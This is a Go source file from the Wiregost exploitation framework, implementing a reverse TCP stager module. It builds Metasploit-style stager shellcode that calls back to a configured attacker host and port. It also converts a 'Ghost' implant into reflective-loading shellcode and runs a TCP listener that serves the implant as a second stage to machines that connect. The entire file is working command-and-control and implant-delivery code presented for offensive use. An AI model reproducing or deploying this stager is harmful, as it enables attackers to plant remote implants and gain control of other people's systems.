// Wiregost - Golang Exploitation Framework
// Copyright © 2020 Para
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <http://www.gnu.org/licenses/>.

package reverse_tcp

import (
	"errors"
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"strconv"
	"strings"

	"github.com/evilsocket/islazy/tui"

	consts "github.com/maxlandon/wiregost/client/constants"
	pb "github.com/maxlandon/wiregost/protobuf/client"
	"github.com/maxlandon/wiregost/server/assets"
	"github.com/maxlandon/wiregost/server/c2"
	"github.com/maxlandon/wiregost/server/core"
	"github.com/maxlandon/wiregost/server/generate"
	"github.com/maxlandon/wiregost/server/log"
	"github.com/maxlandon/wiregost/server/module/templates"
)

// metadataFile - Full path to module metadata
var metadataFile = filepath.Join(assets.GetModulesDir(), "payload/multi/stager/reverse_tcp/metadata.json")

// [ Base Methods ] ------------------------------------------------------------------------//

// ReverseTCPStager - A single stage MTLS implant
type ReverseTCPStager struct {
	Base *templates.Module
}

// New - Instantiates a reverse MTLS module, empty.
func New() *ReverseTCPStager {
	return &ReverseTCPStager{Base: &templates.Module{}}
}

// Init - Module initialization, loads metadata. ** DO NOT ERASE **
func (s *ReverseTCPStager) Init() error {
	return s.Base.Init(metadataFile)
}

// ToProtobuf - Returns protobuf version of module
func (s *ReverseTCPStager) ToProtobuf() *pb.Module {
	return s.Base.ToProtobuf()
}

// SetOption - Sets a module option through its base object.
func (s *ReverseTCPStager) SetOption(option, name string) {
	s.Base.SetOption(option, name)
}

// [ Module Methods ] ------------------------------------------------------------------------//

var rpcLog = log.ServerLogger("stager_reverse_tcp", "module")

// Run - Module entrypoint. ** DO NOT ERASE **
func (s *ReverseTCPStager) Run(command string) (result string, err error) {

	action := strings.Split(command, " ")[0]

	switch action {
	case "run":
		return s.CompileStager()
	case "to_listener":
		return s.toListener()
	}

	return "", nil
}

func (s *ReverseTCPStager) toListener() (result string, err error) {
	host := s.Base.Options["LHostListener"].Value
	if host == "" {
		return "", errors.New("You must specify a listener LHost")
	}
	portUint, err := strconv.Atoi(s.Base.Options["LPortListener"].Value)
	if err != nil {
		return "", errors.New("Error parsing listener LPort")
	}
	port := uint16(portUint)
	if port == 0 {
		return "", errors.New("Invalid listener LPort")
	}

	// Check StageImplant exists, and is the appropriate format
	implant := s.Base.Options["StageImplant"].Value
	config := &generate.GhostConfig{}
	ghostBytes := []byte{}
	if implant == "" {
		return "", errors.New("You must specify a Ghost implant build (shellcode/shared_lib) name")
	} else {
		// Find all ghost names
		ghosts, _ := generate.GhostFiles()
		for _, g := range ghosts {
			ghost := strings.TrimPrefix(g, ".")
			// If ghost is found in names...
			if ghost == implant {
				// Fetch config for checking format
				config, err = generate.GhostConfigByName(ghost)
				if err != nil {
					return "", errors.New("Cannot find Implant config: Impossible to check its format")
				} else {
					// If format is good, keep the bytes
					if (config.Format == pb.GhostConfig_SHARED_LIB) || (config.Format == pb.GhostConfig_SHELLCODE) {
						ghostBytes, err = generate.GhostFileByName(ghost)
						break
					} else {
						return "", errors.New("Wrong format: The provided Ghost Implant Stage is of format EXECUTABLE")
					}
				}
			}
		}
		if len(ghostBytes) == 0 {
			return "", errors.New("The provided Implant Stage does not exist in DB")
		}
	}

	// Generate the Shellcode to attach to stager listener
	ghostShellcode, err := generate.ShellcodeRDIFromBytes(ghostBytes, "RunGhost", "")
	if err != nil {
		shellcodeError := fmt.Sprintf("Error generating listener stage: %s", err.Error())
		return "", errors.New(shellcodeError)
	}

	// Start listener
	ln, err := c2.StartTCPListener(host, port, ghostShellcode)
	if err != nil {
		return "", err
	}

	job := &core.Job{
		ID:   core.GetJobID(),
		Name: "TCP stager listener",
		Description: fmt.Sprintf("Reverse TCP stager listener, serving %s%s%s (%s/%s) as shellcode",
			tui.YELLOW, implant, tui.RESET, config.GOOS, config.GOARCH),
		Protocol: "tcp",
		Port:     port,
		JobCtrl:  make(chan bool),
	}
	go func() {
		<-job.JobCtrl
		rpcLog.Infof("Stopping TCP Stager listener (%d) ...", job.ID)
		ln.Close() // Kills listener GoRoutines in startMutualTLSListener() but NOT connections

		core.Jobs.RemoveJob(job)

		core.EventBroker.Publish(core.Event{
			Job:       job,
			EventType: consts.StoppedEvent,
		})
	}()

	core.Jobs.AddJob(job)

	return fmt.Sprintf("Reverse TCP Stager listener started at %s:%d, serving %s as shellcode", host, port, implant), nil
}

func (s *ReverseTCPStager) CompileStager() (result string, err error) {

	// Check options
	host := s.Base.Options["LHostStager"].Value
	if host == "" {
		return "", errors.New("You must specify a stager LHost")
	}
	portUint, err := strconv.Atoi(s.Base.Options["LPortStager"].Value)
	if err != nil {
		return "", errors.New("Error parsing stager LPort")
	}
	port := uint16(portUint)
	if port == 0 {
		return "", errors.New("Invalid stager LPort")
	}
	format := s.Base.Options["OutputFormat"].Value
	if format == "" {
		return "", errors.New("You must specify a MSF Venom output format")
	}
	arch := s.Base.Options["Arch"].Value
	if arch == "" {
		return "", errors.New("You must specify a CPU architecture for the Stager")
	}

	// Create stager shellcode
	stage, err := generate.GenerateMsfStage(host, port, arch, format, "tcp")
	if err != nil {
		errStage := fmt.Sprintf("Failed to generate MSF stager: %s", err.Error())
		return "", errors.New(errStage)
	}

	// If needed, save the payload
	save := s.Base.Options["FileName"].Value
	if save != "" || format == "raw" {
		filename := ""
		if save == "" {
			// We need a default name, so this code is needed
			implant := s.Base.Options["StageImplant"].Value
			configName := s.Base.Options["StageConfig"].Value
			config := &generate.GhostConfig{}
			if configName == "" {
				if implant == "" {
					return "", errors.New("You must specify a Ghost implant name, either for StageConfig or StageImplant")
				} else {
					config, err = generate.GhostConfigByName(implant)
					if err != nil {
						return "", errors.New("Defaulted to StageImplant for Stager config, but config does not exist")
					}
				}
			} else {
				config, err = generate.GhostConfigByName(implant)
				if err != nil {
					return "", errors.New("Invalid Ghost implant name for Stager config")
				}
			}

			filename = fmt.Sprintf("%s_stager.bin", config.Name)
		} else {
			filename = fmt.Sprintf("%s_stager.bin", save)
		}

		if !strings.HasSuffix(filename, "_stager.bin") {
			filename = filename + "_stager.bin"
		}
		saveTo := fmt.Sprintf(filepath.Join(assets.GetStagersDir(), filename))
		err = ioutil.WriteFile(saveTo, stage, os.ModePerm)
		if err != nil {
			result = fmt.Sprintf("Failed to write stager as %s\n", saveTo)
			return "", errors.New(result)
		}
		result = fmt.Sprintf("Reverse TCP stager saved as %s\n", saveTo)
		return result, nil
	}

	// Else, return the raw shellcode
	return string(stage), nil
}
